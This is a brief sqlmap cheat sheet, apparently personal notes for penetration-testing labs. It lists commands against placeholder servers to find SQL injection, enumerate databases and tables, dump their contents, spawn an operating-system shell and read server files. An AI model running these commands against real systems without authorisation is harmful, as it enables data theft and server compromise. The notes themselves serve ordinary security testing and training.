## SQLmap

- GET: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php?id=1"`
- POST: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1"`
- Cookies: `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --cookie="id=1*"`
- JSON:  `Copy Request Headers --> req.txt; add in the JSON with "" surrounding the variables; sqlmap -r req.txt`


1. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" --dbs`
2. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> --tables`
3. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> -T <table> --dump`
4. `sqlmap -u "http://<SERVER_IP>:<PORT>/index.php" --data "id=1" -D <database> -T <table> -C <column> --dump`

`--flush-session` to start again

`--no-cast` to ensure correct data is gotten from blind sql

`--risk=3` and `--level=5` for more aggressive SQLi detection

`--prefix` and `--suffix` to predefine the wrappers

`--csrf-token` to define the variable name that is the token

`--union-cols=n` to manually specify number of union columns 

`--os-shell --technique=E` to spawn a shell

`--file-read` to read files
